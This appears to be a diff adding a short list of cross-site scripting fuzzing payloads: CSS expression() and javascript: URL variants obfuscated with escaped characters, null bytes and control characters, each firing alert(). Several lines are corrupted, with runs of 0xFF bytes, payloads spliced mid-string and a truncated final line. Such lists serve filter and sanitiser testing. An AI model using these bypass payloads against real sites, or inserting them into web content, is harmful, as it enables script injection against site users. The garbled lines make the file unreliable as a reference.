@@ -1,0 +1,12 @@
+iÿÿÿÿpt>javascript:alert(1)</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF
+ABC<div style="x:exp\x00ression(javascript:alert(2)">DEF
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
+Ax:\x09expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascrC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+ABC<ÿÿÿÿÿÿÿÿe="x:\x09expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE30\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">otest</a>
+<a href="\x01
